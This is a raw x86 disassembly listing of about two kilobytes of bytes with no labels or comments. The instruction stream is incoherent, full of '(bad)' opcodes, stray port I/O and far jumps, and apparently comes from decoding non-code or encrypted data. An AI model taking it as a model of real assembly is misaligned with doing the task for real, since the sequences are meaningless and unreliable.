  43777f:	jmp    0x81d3150d
  437784:	sub    al,0x6b
  437786:	scas   eax,DWORD PTR es:[edi]
  437787:	add    al,0xfd
  437789:	add    al,BYTE PTR [edx+0x6a463ba5]
  43778f:	sbb    BYTE PTR [ebx-0x547c9a89],cl
  437795:	out    0xe6,al
  437797:	lahf   
  437798:	sub    eax,0x8ec38763
  43779d:	add    dl,BYTE PTR [esi+0x37]
  4377a0:	pusha  
  4377a1:	cmp    al,0x80
  4377a3:	cmp    al,0x5
  4377a5:	mov    bl,BYTE PTR [edi]
  4377a7:	sbb    DWORD PTR [ecx-0x46],edi
  4377aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4377ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4377ac:	xor    BYTE PTR [esi],cl
  4377ae:	(bad)  
  4377b0:	inc    edx
  4377b1:	adc    al,0xbe
  4377b3:	inc    edx
  4377b4:	enter  0x4569,0x56
  4377b8:	sti    
  4377b9:	xchg   edi,eax
  4377ba:	aaa    
  4377bb:	xlat   BYTE PTR ds:[ebx]
  4377bc:	inc    ecx
  4377bd:	popf   
  4377be:	int3   
  4377bf:	loope  0x437781
  4377c1:	pop    es
  4377c2:	jb     0x437799
  4377c4:	push   0x3519636
  4377c9:	pop    es
  4377ca:	add    edx,DWORD PTR [esi-0x4b]
  4377cd:	ja     0x43782e
  4377cf:	dec    ebx
  4377d0:	js     0x4377c7
  4377d2:	and    DWORD PTR gs:[eax],0x15
  4377d6:	sbb    DWORD PTR [ebp+0x483ed5e1],esp
  4377dc:	(bad)  
  4377de:	jl     0x437779
  4377e0:	out    0xa6,al
  4377e2:	lahf   
  4377e3:	mov    esi,0xf24bbf18
  4377e8:	cmp    BYTE PTR [edx-0x197c66ee],al
  4377ee:	loope  0x437851
  4377f0:	pop    ecx
  4377f1:	and    dl,BYTE PTR [eax-0x5ad6ef6a]
  4377f7:	aam    0xb8
  4377f9:	cdq    
  4377fa:	out    0x8b,al
  4377fc:	outs   dx,DWORD PTR ds:[esi]
  4377fd:	jg     0x437846
  4377ff:	mov    edx,0x80927d88
  437804:	or     bh,bh
  437806:	adc    dl,bh
  437808:	dec    esp
  437809:	add    ch,dh
  43780b:	loop   0x43786e
  43780d:	arpl   WORD PTR [esi+0x7ebf29a6],bp
  437813:	inc    edi
  437814:	(bad)  
  437815:	jmp    0x95d1:0x41f7158e
  43781c:	retf   
  43781d:	add    eax,0x24776e0a
  437822:	inc    esp
  437823:	fist   WORD PTR fs:[edx]
  437826:	pop    ebx
  437827:	test   ebp,ebp
  437829:	push   0xaa0c19e
  43782e:	out    dx,al
  43782f:	into   
  437830:	mov    al,ds:0x45b1c9f1
  437835:	rcl    DWORD PTR [ebx+0x5fe316d2],1
  43783b:	(bad)  
  43783d:	mov    eax,0xee06015c
  437842:	icebp  
  437843:	dec    ebp
  437844:	fsub   DWORD PTR [edi]
  437846:	xchg   edx,eax
  437847:	(bad)  
  437848:	pop    eax
  437849:	sub    al,ch
  43784b:	xchg   ebx,eax
  43784c:	push   eax
  43784d:	test   edi,eax
  43784f:	rcl    BYTE PTR [ecx],cl
  437851:	loop   0x4377f1
  437853:	xchg   di,ax
  437855:	xor    ebx,DWORD PTR [edi]
  437857:	push   esp
  437858:	lea    edx,[ecx]
  43785a:	push   ds
  43785b:	xchg   edi,eax
  43785c:	repnz repnz fwait
  43785f:	push   esi
  437860:	fwait
  437861:	jge    0x43782d
  437863:	test   BYTE PTR [edi-0x32ec81fb],ah
  437869:	jg     0x43782a
  43786b:	rcr    cl,1
  43786d:	xor    eax,0x6188941b
  437872:	test   al,0xce
  437874:	xchg   ebx,eax
  437875:	ror    BYTE PTR [esi],cl
  437877:	loope  0x43782e
  437879:	add    eax,0x4fbc6e
  43787e:	jmp    0x7bda2a09
  437883:	int    0x7a
  437885:	xor    eax,0x7967d3a9
  43788a:	jl     0x437860
  43788c:	dec    eax
  43788d:	or     BYTE PTR [eax],bl
  43788f:	mov    ebp,0xf9d38f26
  437894:	mov    edi,edi
  437896:	jae    0x437880
  437898:	dec    ecx
  437899:	aas    
  43789a:	pop    ds
  43789b:	neg    DWORD PTR [eax-0x64]
  43789e:	dec    esi
  43789f:	rcl    dl,cl
  4378a1:	pop    edx
  4378a2:	mov    edx,ebp
  4378a4:	add    eax,ebx
  4378a6:	dec    edx
  4378a7:	adc    eax,0x8f41b843
  4378ac:	test   DWORD PTR [edi],edx
  4378ae:	je     0x437908
  4378b0:	push   0xa4d7cf7e
  4378b5:	mov    edi,0x8ad24bf4
  4378ba:	push   ds
  4378bb:	sbb    al,0x56
  4378bd:	or     dl,BYTE PTR [edi]
  4378bf:	fld    DWORD PTR [edx+0x1ac1eda5]
  4378c5:	pushfw 
  4378c7:	push   esp
  4378c8:	cld    
  4378c9:	add    ebx,edi
  4378cb:	jle    0x437855
  4378cd:	mov    cl,0x77
  4378cf:	cmp    eax,0x7188e617
  4378d4:	adc    al,BYTE PTR [eax]
  4378d6:	adc    bl,ch
  4378d8:	dec    esp
  4378d9:	or     cl,BYTE PTR [ebx+0x42]
  4378dc:	fidiv  DWORD PTR [edx-0x1877a91a]
  4378e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4378e3:	xlat   BYTE PTR ds:[ebx]
  4378e4:	fs jl  0x437874
  4378e7:	add    ebp,DWORD PTR [ebx+0x3]
  4378ea:	cwde   
  4378eb:	into   
  4378ec:	lahf   
  4378ed:	xchg   edi,eax
  4378ee:	inc    eax
  4378ef:	call   DWORD PTR [esi-0x6911f5aa]
  4378f5:	inc    ecx
  4378f6:	dec    ecx
  4378f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4378f8:	jb     0x43793d
  4378fa:	xchg   edx,eax
  4378fb:	inc    ebp
  4378fc:	and    al,0xd
  4378fe:	test   bl,dl
  437900:	sbb    al,0xde
  437902:	jl     0x437929
  437904:	repz lds esi,FWORD PTR [eax+0x1f995380]
  43790b:	dec    ebp
  43790c:	mov    bl,0x17
  43790e:	xor    eax,0xb82b2a09
  437913:	aad    0x27
  437915:	inc    ebp
  437916:	inc    edx
  437917:	outs   dx,DWORD PTR ds:[esi]
  437918:	lea    bx,[ecx+0x40]
  43791c:	mov    BYTE PTR ds:0x14f6456b,al
  437922:	add    ch,al
  437924:	scas   al,BYTE PTR es:[edi]
  437925:	cmova  edx,ebx
  437928:	inc    edi
  437929:	xchg   DWORD PTR [eax],edx
  43792b:	push   0xd7309e4b
  437930:	outs   dx,BYTE PTR ds:[esi]
  437931:	les    ebx,FWORD PTR [ebx+0x53]
  437934:	loopne 0x4378da
  437936:	jecxz  0x437941
  437938:	sub    dh,ch
  43793a:	rcl    BYTE PTR [esp+ebp*4+0x4f],cl
  43793e:	imul   edx,ebp,0x66e2b52b
  437944:	repz sub bh,BYTE PTR [ebx]
  437947:	mov    dh,0x89
  437949:	jge    0x43795e
  43794b:	pop    esi
  43794c:	enter  0xc641,0x3f
  437950:	call   0x7863c574
  437955:	lea    edx,[esi-0x175c88dd]
  43795b:	cmp    dl,al
  43795d:	jle    0x43797d
  43795f:	jmp    0x437990
  437961:	inc    edi
  437962:	rcl    BYTE PTR [edx+0x432e2523],cl
  437968:	xor    BYTE PTR [esi+0x11],dl
  43796b:	lods   eax,DWORD PTR ds:[esi]
  43796c:	cld    
  43796d:	shr    BYTE PTR [eax],0x2c
  437970:	int    0x8a
  437972:	mov    al,ds:0x163854e8
  437977:	xchg   BYTE PTR [edx-0x70],dh
  43797a:	pop    ds
  43797b:	xor    DWORD PTR [ecx+0x5204e39d],esi
  437981:	cmc    
  437982:	jnp    0x437959
  437984:	mov    dh,0x41
  437986:	pop    ds
  437987:	adc    BYTE PTR [ebp-0x76aa9424],ah
  43798d:	mov    bh,0xe7
  43798f:	xchg   BYTE PTR [edi],bl
  437991:	mov    dh,0x12
  437993:	mov    edi,0xb7b81c3f
  437998:	adc    ebp,0xdd296107
  43799e:	jne    0x43797a
  4379a0:	inc    DWORD PTR [edi-0x34]
  4379a3:	adc    eax,0xd847a5d0
  4379a8:	sub    al,0xb
  4379aa:	and    ch,BYTE PTR [ebp+0x7f4c4902]
  4379b0:	xor    DWORD PTR [edx+0x5d7c3cf0],ecx
  4379b6:	(bad)  
  4379b7:	and    eax,0xb872021b
  4379bc:	xor    al,0xe9
  4379be:	cmc    
  4379bf:	push   edi
  4379c0:	adc    eax,0x69efe603
  4379c5:	out    0xa4,eax
  4379c7:	cmp    bl,BYTE PTR [esi-0x35]
  4379ca:	pop    eax
  4379cb:	jae    0x437966
  4379cd:	gs arpl cx,bp
  4379d0:	or     BYTE PTR [eax+0x23],0x54
  4379d4:	call   0x33d2:0xf9d5f531
  4379db:	loop   0x437a54
  4379dd:	cmp    al,0x9f
  4379df:	aad    0x7d
  4379e1:	cld    
  4379e2:	cmp    bx,WORD PTR [ebp+esi*1+0x42b6ee16]
  4379ea:	loope  0x437a35
  4379ec:	cld    
  4379ed:	in     eax,0x99
  4379ef:	in     al,dx
  4379f0:	xchg   edx,eax
  4379f1:	add    eax,DWORD PTR [esi]
  4379f3:	pop    esp
  4379f4:	push   cs
  4379f5:	mov    cs,WORD PTR [ebp+eax*2-0x12]
  4379f9:	jmp    0x4379bb
  4379fb:	xchg   ebp,eax
  4379fc:	cmp    edi,ebp
  4379fe:	pusha  
  4379ff:	ror    DWORD PTR [esi+0x27],cl
  437a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437a03:	and    al,0x70
  437a05:	push   esp
  437a06:	or     al,0xd7
  437a08:	mov    edi,0xbb0a1ead
  437a0d:	cmc    
  437a0e:	mov    eax,ds:0x1f546692
  437a13:	jae    0x437a47
  437a15:	jl     0x4379f3
  437a17:	sub    DWORD PTR cs:[ebp-0x6deb84e5],ecx
  437a1e:	loop   0x4379f5
  437a20:	pushf  
  437a21:	in     al,dx
  437a22:	mov    ds:0xd719dbe1,eax
  437a27:	push   edi
  437a28:	mov    edx,0x622f7805
  437a2d:	xor    ecx,DWORD PTR [ebp-0x7bfda7c3]
  437a33:	ja     0x437a43
  437a35:	lahf   
  437a36:	cmp    DWORD PTR [ecx+0x11],eax
  437a39:	dec    esp
  437a3a:	pop    ss
  437a3b:	(bad)  
  437a3c:	mov    bl,0x41
  437a3e:	mov    edi,0x84b206d9
  437a43:	sbb    BYTE PTR [eax-0x12f88790],cl
  437a49:	add    eax,0x1f2c3388
  437a4e:	cmp    BYTE PTR [ecx+0x12],ch
  437a51:	mov    eax,ds:0xce8de160
  437a56:	outs   dx,DWORD PTR ds:[esi]
  437a57:	pop    ebp
  437a58:	push   ss
  437a59:	add    ecx,0x7a5259bb
  437a5f:	dec    ecx
  437a60:	leave  
  437a61:	jecxz  0x437a4c
  437a63:	dec    edx
  437a64:	adc    al,0x56
  437a66:	pop    ds
  437a67:	dec    ecx
  437a68:	push   edi
  437a69:	inc    ecx
  437a6a:	mov    cl,0x28
  437a6c:	(bad)  
  437a6d:	mov    edi,0xe019d684
  437a72:	pop    esp
  437a73:	out    0x32,eax
  437a75:	fcomi  st,st(6)
  437a77:	sbb    eax,0x231e374c
  437a7c:	sbb    eax,0x53302aa6
  437a81:	jle    0x437a68
  437a83:	xor    eax,0x42f48f27
  437a88:	dec    eax
  437a89:	cwde   
  437a8a:	sub    DWORD PTR fs:[ebx+0x59],edx
  437a8e:	in     al,0x96
  437a90:	or     esp,esp
  437a92:	arpl   WORD PTR [ebx-0x48a48075],sp
  437a98:	cli    
  437a99:	mov    cl,0xaa
  437a9b:	sbb    dh,BYTE PTR [eax]
  437a9d:	rol    DWORD PTR [ebx-0x2c],0xbc
  437aa1:	inc    esi
  437aa2:	addr16 fcmovnbe st,st(7)
  437aa5:	jns    0x437ad8
  437aa7:	push   0xffffff89
  437aa9:	cmp    ebx,DWORD PTR [ecx-0x4f78e28a]
  437aaf:	lods   eax,DWORD PTR ds:[esi]
  437ab0:	xchg   ecx,eax
  437ab1:	dec    edx
  437ab2:	loopne 0x437b02
  437ab4:	jne    0x437ac5
  437ab6:	pusha  
  437ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ab8:	es inc esi
  437aba:	push   esi
  437abb:	sbb    ecx,DWORD PTR [edi+0x63]
  437abe:	push   ds
  437abf:	imul   ebx,DWORD PTR [ecx-0x41],0x43
  437ac3:	cmp    eax,0xd6ff168c
  437ac8:	jo     0x437ad6
  437aca:	aam    0x14
  437acc:	mov    cl,0xa6
  437ace:	rcl    BYTE PTR [eax+edi*2],cl
  437ad1:	frstor [edx+0x77]
  437ad4:	add    esi,DWORD PTR [ebx+0x10]
  437ad7:	loop   0x437ae0
  437ad9:	popf   
  437ada:	xor    al,0x17
  437adc:	pop    eax
  437add:	pop    ebp
  437ade:	mov    bl,0xd5
  437ae0:	mov    ecx,0xa9b80e
  437ae5:	or     BYTE PTR [esi],ch
  437ae7:	in     eax,dx
  437ae8:	jmp    0x5c049a53
  437aed:	iret   
  437aee:	dec    edx
  437aef:	shl    ah,1
  437af1:	mov    ecx,0x7bd69c91
  437af6:	mov    edx,esp
  437af8:	popf   
  437af9:	adc    edx,DWORD PTR [esi-0x71b84f60]
  437aff:	push   0x89a80787
  437b04:	hlt    
  437b05:	leave  
  437b06:	mov    al,ds:0xb57396aa
  437b0b:	scas   eax,DWORD PTR es:[edi]
  437b0c:	and    ebx,DWORD PTR [eax+0x4ff6efb]
  437b12:	pusha  
  437b13:	fistp  DWORD PTR [ebx-0x4]
  437b16:	push   eax
  437b17:	or     eax,0x8c063eb9
  437b1c:	sub    cl,BYTE PTR [edx-0x6]
  437b1f:	or     ch,bh
  437b21:	add    eax,0xf8bc948a
  437b26:	in     al,dx
  437b27:	retf   0x5788
  437b2a:	jns    0x437b38
  437b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437b2d:	cdq    
  437b2e:	icebp  
  437b2f:	mov    ebx,0x2ce21784
  437b34:	sahf   
  437b35:	enter  0x55aa,0xde
  437b39:	aas    
  437b3a:	cmp    BYTE PTR [ebp-0x76190cb5],ch
  437b40:	mov    BYTE PTR [edi],al
  437b42:	and    DWORD PTR [ecx-0x1809dedb],ecx
  437b48:	icebp  
  437b49:	add    eax,0xe0eee220
  437b4e:	imul   esp,DWORD PTR [esi],0xfffffffd
  437b51:	cmp    eax,0x4baddd1f
  437b56:	call   0xc458:0x52cccb07
  437b5d:	daa    
  437b5e:	or     eax,0x6b9317d7
  437b63:	inc    esp
  437b64:	mov    WORD PTR es:[ebp+ebx*1-0x34ac7449],?
  437b6c:	or     bh,ch
  437b6e:	in     al,0xc8
  437b70:	fisubr DWORD PTR [edx]
  437b72:	adc    ch,0x4a
  437b75:	sbb    al,0x41
  437b77:	rol    DWORD PTR [edi-0x77319361],0x11
  437b7e:	push   ebx
  437b7f:	xor    DWORD PTR [esp+ebp*8+0x230bbdb],edx
  437b86:	loopne 0x437bce
  437b88:	or     BYTE PTR ds:[esi],cl
  437b8b:	cmp    eax,0x5169a1e4
  437b90:	pop    edx
  437b91:	in     eax,0xf0
  437b93:	jle    0x437b9d
  437b95:	jnp    0x437bd6
  437b97:	iret   
  437b98:	cmp    ecx,DWORD PTR [ebp+0xa885f37]
  437b9e:	lods   al,BYTE PTR ds:[esi]
  437b9f:	test   BYTE PTR ds:0xf4e96b60,0xeb
  437ba6:	inc    esi
  437ba7:	aam    0x8b
  437ba9:	pushf  
  437baa:	fwait
  437bab:	cmp    al,0x67
  437bad:	push   ebx
  437bae:	sub    BYTE PTR [edi+0x58],al
  437bb1:	mov    dl,0x46
  437bb3:	sub    DWORD PTR [edx+eax*1],esi
  437bb6:	push   0xffffff96
  437bb8:	xchg   edx,eax
  437bb9:	xor    eax,0xd553f09
  437bbe:	pop    ds
  437bbf:	mov    DWORD PTR ds:0xbe3165d3,esp
  437bc5:	adc    al,dh
  437bc7:	aad    0x71
  437bc9:	push   es
  437bca:	pop    esi
  437bcb:	test   eax,0x7c886bdf
  437bd0:	mov    edi,eax
  437bd2:	retf   
  437bd3:	dec    esp
  437bd4:	in     eax,dx
  437bd5:	mov    gs,WORD PTR [edi+0x4a05f8b2]
  437bdb:	cs push 0xffffff91
  437bde:	push   ebx
  437bdf:	mov    ch,0xb2
  437be1:	or     ebx,DWORD PTR [edx+0x2b]
  437be4:	push   ecx
  437be5:	cs inc esp
  437be7:	ins    DWORD PTR es:[edi],dx
  437be8:	mov    DWORD PTR [edi-0x74],ebx
  437beb:	shl    DWORD PTR [ebp+ebp*2-0x17],1
  437bef:	aam    0x41
  437bf1:	dec    ebp
  437bf2:	aad    0xbf
  437bf4:	fwait
  437bf5:	loope  0x437bc4
  437bf7:	pop    ebp
  437bf8:	mov    bh,BYTE PTR [edi+0x25]
  437bfb:	mov    ch,0xd2
  437bfd:	cwde   
  437bfe:	dec    ebx
  437bff:	jne    0x437c79
  437c01:	mov    bh,0x89
  437c03:	aam    0x4c
  437c05:	cs xchg ebx,eax
  437c07:	iret   
  437c08:	sbb    esp,ecx
  437c0a:	aas    
  437c0b:	push   eax
  437c0c:	mov    DWORD PTR [edi+0x1210ea40],esi
  437c12:	sub    ecx,DWORD PTR [edi-0x2203fa06]
  437c18:	sub    bl,BYTE PTR [edi+0x4e]
  437c1b:	fwait
  437c1c:	aam    0x71
  437c1e:	cdq    
  437c1f:	xlat   BYTE PTR ds:[ebx]
  437c20:	fild   DWORD PTR [edx]
  437c22:	scas   eax,DWORD PTR es:[edi]
  437c23:	add    al,0x4f
  437c25:	sbb    al,0x18
  437c27:	jmp    0x57cba34f
  437c2c:	retf   
  437c2d:	dec    esp
  437c2e:	pop    esi
  437c2f:	cmp    ax,0x61ef
  437c33:	or     DWORD PTR [esi-0x23b95811],eax
  437c39:	pop    es
  437c3a:	pop    ds
  437c3b:	mov    ebp,0xfaadf16e
  437c40:	adc    BYTE PTR [ebp+0x7a],cl
  437c43:	jne    0x437bf5
  437c45:	add    eax,0x9e6739d4
  437c4a:	xor    DWORD PTR ds:0x5f1e7224,ebp
  437c50:	fidivr WORD PTR [edi+0x5e]
  437c53:	mov    ebp,0x11902b98
  437c58:	ret    0xfa02
  437c5b:	inc    esp
  437c5c:	into   
  437c5d:	or     ebp,DWORD PTR [edx+0x36]
  437c60:	retf   0x6594
  437c63:	add    eax,0x76d8c8a5
  437c68:	(bad)  
  437c6a:	ss loopne 0x437cd3
  437c6d:	add    bh,BYTE PTR [eax]
  437c6f:	xor    ah,BYTE PTR [ebp+0x6f]
  437c72:	pop    ecx
  437c73:	dec    esp
  437c74:	cmp    bl,cl
  437c76:	pop    ds
  437c77:	icebp  
  437c78:	push   ds
  437c79:	cld    
  437c7a:	in     al,0xdd
  437c7c:	sub    cl,BYTE PTR [ebx+eax*4+0x23f906d5]
  437c83:	int3   
  437c84:	and    dl,dh
  437c86:	or     edx,DWORD PTR [ecx-0x4f88b64c]
  437c8c:	mov    dh,0xb2
  437c8e:	pop    ds
  437c8f:	inc    esi
  437c90:	mov    edx,0x40de87d0
  437c95:	div    DWORD PTR [esp+edx*8]
  437c98:	imul   esi,ecx,0x0
  437c9b:	inc    eax
  437c9c:	or     DWORD PTR [edi+0x2f440aae],ebp
  437ca2:	push   ds
  437ca3:	and    ebx,DWORD PTR [eax-0x4]
  437ca6:	lea    ebx,[edx-0x62]
  437ca9:	loop   0x437c83
  437cab:	aad    0x87
  437cad:	retf   
  437cae:	(bad)  
  437caf:	fdivr  QWORD PTR [ebp-0x2]
  437cb2:	fistp  DWORD PTR [edi-0x22a6d478]
  437cb8:	inc    edi
  437cb9:	cmp    ah,BYTE PTR [edx+0x49]
  437cbc:	pop    eax
  437cbd:	sbb    al,0xb2
  437cbf:	pop    edi
  437cc0:	test   eax,0x2e0ed718
  437cc5:	inc    ecx
  437cc6:	xor    BYTE PTR [eax],0xbc
  437cc9:	call   0x93fd:0xdf88ed58
  437cd0:	pushf  
  437cd1:	lds    ecx,FWORD PTR [ebx-0x4b]
  437cd4:	daa    
  437cd5:	inc    edi
  437cd6:	pushf  
  437cd7:	pop    es
  437cd8:	push   cs
  437cd9:	sbb    DWORD PTR [eax+0x131fc271],0x2a
  437ce0:	shl    bh,0x18
  437ce3:	in     eax,dx
  437ce4:	xchg   edi,eax
  437ce5:	frstor [edx+0x14]
  437ce8:	lods   eax,DWORD PTR ds:[esi]
  437ce9:	cmp    bl,BYTE PTR [edx-0x67fd2e1c]
  437cef:	inc    ecx
  437cf0:	cmc    
  437cf1:	in     eax,dx
  437cf2:	lods   al,BYTE PTR ds:[esi]
  437cf3:	xor    ebx,DWORD PTR gs:[eax-0x7dc32a9a]
  437cfa:	xchg   DWORD PTR [edi+0x68ce92d8],ebp
  437d00:	mov    fs,WORD PTR [esi]
  437d02:	dec    esp
  437d03:	push   esi
  437d04:	add    al,0x3e
  437d06:	sahf   
  437d07:	pop    ecx
  437d08:	lahf   
  437d09:	mov    esp,0x5b89ecfc
  437d0e:	fdivr  QWORD PTR [ecx-0x2e]
  437d11:	mov    eax,0x25eb860
  437d16:	adc    BYTE PTR [esi+0x6e],0x81
  437d1a:	iret   
  437d1b:	test   BYTE PTR [ebx+0x3bdd60cb],0x38
  437d22:	mov    esi,0xe33832e6
  437d27:	int3   
  437d28:	jmp    0x13d4:0x85a3f202
  437d2f:	dec    ebx
  437d30:	pop    edx
  437d31:	or     esp,DWORD PTR [eax+0x63]
  437d34:	ds mov bh,0x28
  437d37:	sub    edi,esi
  437d39:	leave  
  437d3a:	aam    0xf5
  437d3c:	pop    eax
  437d3d:	add    ecx,DWORD PTR [edx+edi*1]
  437d40:	jb     0x437d38
  437d42:	inc    eax
  437d43:	xor    esi,DWORD PTR [esi-0x52]
  437d46:	pop    ds
  437d47:	ja     0x437d61
  437d49:	or     eax,0xbed2afc8
  437d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437d4f:	aad    0x85
  437d51:	sub    eax,0x367df956
  437d56:	in     eax,dx
  437d57:	sbb    ecx,DWORD PTR [eax+0x7992d47d]
  437d5d:	popf   
  437d5e:	xchg   ebx,eax
  437d5f:	mov    cl,0xb8
  437d61:	add    ah,al
  437d63:	fistp  DWORD PTR es:[ebp-0x647565df]
  437d6a:	sub    ch,0x2b
  437d6d:	jo     0x437d4d
  437d6f:	and    BYTE PTR [edi-0x1cee6253],dl
  437d75:	inc    ebp
  437d76:	mov    bl,0x64
  437d78:	and    ah,BYTE PTR [eax+ebx*1+0x4e3005d7]
  437d7f:	and    ah,BYTE PTR [ebp+0xd]
  437d82:	add    DWORD PTR [eax-0x403cea78],0x66
  437d89:	out    dx,eax
  437d8a:	mov    ecx,0xd81d38f4
  437d8f:	add    DWORD PTR [ecx-0x671593c1],edx
  437d95:	retf   0x1052
  437d98:	mov    BYTE PTR [ecx-0x36],ch
  437d9b:	inc    eax
  437d9c:	pop    ebp
  437d9d:	dec    ecx
  437d9e:	mov    eax,0x8c141b90
  437da3:	and    eax,DWORD PTR [eax+0x32]
  437da6:	adc    eax,0x67b082b7
  437dab:	xchg   ebx,eax
  437dac:	(bad)  
  437dad:	pop    edi
  437dae:	ja     0x437d44
  437db0:	aam    0x83
  437db2:	lock in al,0x54
  437db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437db6:	fbstp  TBYTE PTR [eax-0x460ce27c]
  437dbc:	jmp    0x7cd4ddfc
  437dc1:	pop    ebx
  437dc2:	xor    DWORD PTR [eax+edi*1],eax
  437dc5:	mov    ch,0x8f
  437dc7:	mov    esp,ecx
  437dc9:	add    eax,0x3ab73c63
  437dce:	sub    DWORD PTR [edx+0x1fa6641],0x70400378
  437dd8:	xchg   ecx,eax
  437dd9:	cli    
  437dda:	lock iret 
  437ddc:	mov    BYTE PTR [edi-0x11],dh
  437ddf:	sbb    bl,BYTE PTR [edx-0x2bea8477]
  437de5:	out    0xd6,al
  437de7:	aad    0x3c
  437de9:	pop    edx
  437dea:	pushf  
  437deb:	mov    ah,0x12
  437ded:	or     edi,DWORD PTR [eax]
  437def:	lods   eax,DWORD PTR ds:[esi]
  437df0:	mov    fs,WORD PTR [ecx]
  437df2:	sub    ebp,edi
  437df4:	add    al,dh
  437df6:	push   esi
  437df7:	push   esp
  437df8:	xchg   esp,eax
  437df9:	test   eax,0x72d4d597
  437dfe:	shl    DWORD PTR [ebx+esi*2-0x7109db57],0x1b
  437e06:	(bad)  
  437e07:	mov    WORD PTR [esp+ebx*4-0x67],ds
  437e0b:	fucomi st,st(1)
  437e0d:	mov    WORD PTR [edi-0x3],ss
  437e10:	dec    esp
  437e11:	dec    ecx
  437e12:	jbe    0x437e40
  437e14:	cmp    al,BYTE PTR [edx]
  437e16:	sti    
  437e17:	out    dx,eax
  437e18:	push   ds
  437e19:	(bad)  
  437e1a:	out    dx,eax
  437e1b:	mov    ah,0x8a
  437e1d:	mov    ebp,0x7f29844b
  437e22:	aam    0x58
  437e24:	(bad)  
  437e25:	add    DWORD PTR [eax-0x36206fc6],edx
  437e2b:	adc    al,BYTE PTR [ebx+0x40df7f00]
  437e31:	dec    ebx
  437e32:	jo     0x437e08
  437e34:	sub    ah,dh
  437e36:	cdq    
  437e37:	lock xchg ebx,eax
  437e39:	push   edx
  437e3a:	xchg   edx,eax
  437e3b:	sub    cl,BYTE PTR [eax+0x4315d82d]
  437e41:	jecxz  0x437eb8
  437e43:	cmp    dh,ch
  437e45:	add    ch,BYTE PTR [edx]
  437e47:	cmp    ah,BYTE PTR [ebp+0x30977e48]
  437e4d:	mov    ch,0x60
  437e4f:	xchg   ebp,eax
  437e50:	push   ecx
  437e51:	gs dec esi
  437e53:	dec    ebx
  437e54:	add    bh,BYTE PTR [edi+0x6]
  437e57:	xlat   BYTE PTR ds:[ebx]
  437e58:	loopne 0x437ddc
  437e5a:	mov    edx,0x27d73ec6
  437e5f:	ret    
  437e60:	mov    BYTE PTR [ecx],ch
  437e62:	mov    esi,0x4f4f1016
  437e67:	xchg   BYTE PTR [edi+0x3],ch
  437e6a:	les    esp,FWORD PTR [ebx]
  437e6c:	xchg   edi,eax
  437e6d:	(bad)
  437e70:	adc    al,0x51
  437e72:	sub    bl,BYTE PTR [ebp-0x78]
  437e75:	daa    
  437e76:	outs   dx,DWORD PTR ds:[esi]
  437e77:	jge    0x437ee4
  437e79:	mov    cl,BYTE PTR [ecx]
  437e7b:	inc    ebx
  437e7d:	sbb    al,0xb8
  437e7f:	push   es
  437e80:	jmp    0x49765e06
  437e85:	mov    ch,0x35
  437e87:	xlat   BYTE PTR ds:[ebx]
  437e88:	xchg   esi,eax
  437e89:	test   DWORD PTR [ecx+0x7945f1d9],esi
  437e8f:	add    eax,edx
  437e91:	leave  
  437e92:	out    0xae,al
  437e94:	addr16 pop es
  437e96:	xchg   ecx,eax
  437e97:	dec    ebx
  437e98:	rol    DWORD PTR [edx],cl
  437e9a:	mov    ds:0xab930898,eax
  437e9f:	popf   
  437ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ea1:	lock pusha 
  437ea3:	jnp    0x437e29
  437ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437ea6:	and    al,0x28
  437ea8:	jbe    0x437ead
  437eaa:	push   ss
  437eab:	mov    BYTE PTR [ebx],cl
  437ead:	in     al,dx
  437eae:	into   
  437eaf:	pop    es
  437eb0:	fsub   DWORD PTR [eax]
  437eb2:	push   ds
  437eb3:	jns    0x437e37
  437eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437eb6:	push   ebx
  437eb7:	in     eax,dx
  437eb8:	push   edi
  437eb9:	call   0x4d1e:0x1ee11c1a
  437ec0:	inc    ebp
  437ec1:	sub    eax,0xa1e5979a
  437ec6:	pusha  
  437ec7:	mov    eax,ds:0xedcfca40
  437ecc:	and    cl,bh
  437ece:	jg     0x437ea2
  437ed0:	adc    al,0x25
  437ed2:	or     ah,BYTE PTR [edx+eax*4]
  437ed5:	rcr    DWORD PTR [eax],1
  437ed7:	push   edi
  437ed8:	test   al,0x7
  437eda:	xchg   edx,eax
  437edb:	mov    cl,ch
  437edd:	inc    esp
  437ede:	cwde   
  437edf:	aas    
  437ee0:	add    esi,DWORD PTR [bx+di]
  437ee3:	test   edi,edi
  437ee5:	scas   al,BYTE PTR es:[edi]
  437ee6:	fst    QWORD PTR [eax+esi*8+0x2]
  437eea:	jbe    0x437f3e
  437eec:	or     al,0xf3
  437eef:	pop    edx
  437ef0:	push   ebp
  437ef1:	mul    DWORD PTR [eax+0x4d]
  437ef4:	push   ecx
  437ef5:	shl    edi,cl
  437ef7:	jmp    0x437f39
  437ef9:	adc    eax,0xf1aed553
  437efe:	out    0x6a,al
  437f00:	iret   
  437f01:	cld    
  437f02:	mov    ds:0x614f886f,eax
  437f07:	sbb    bl,BYTE PTR [edx+0x6]
  437f0a:	sti    
  437f0b:	cmp    eax,0x19e80291
  437f10:	in     eax,0x58
  437f12:	arpl   dx,dx
  437f14:	cs je  0x437f35
  437f17:	or     eax,0x204759ac
  437f1c:	cmp    al,0xde
  437f1e:	cs in  al,0xbd
  437f21:	add    ah,dh
  437f23:	xchg   ebp,eax
  437f24:	pop    esp
  437f25:	cmp    eax,0x2f6bf29c
  437f2a:	jp     0x437edf
  437f2c:	(bad)  [edx-0x3f]
  437f2f:	push   ebp
  437f30:	lahf   
  437f31:	into   
  437f32:	fwait
  437f33:	pop    esp
  437f34:	je     0x437f39
  437f36:	es fmulp st(6),st
  437f39:	inc    edx
  437f3a:	dec    ecx
  437f3b:	outs   dx,DWORD PTR ds:[esi]
  437f3c:	hlt    
  437f3d:	aas    
  437f3e:	ins    BYTE PTR es:[edi],dx
  437f3f:	jnp    0x437ee5
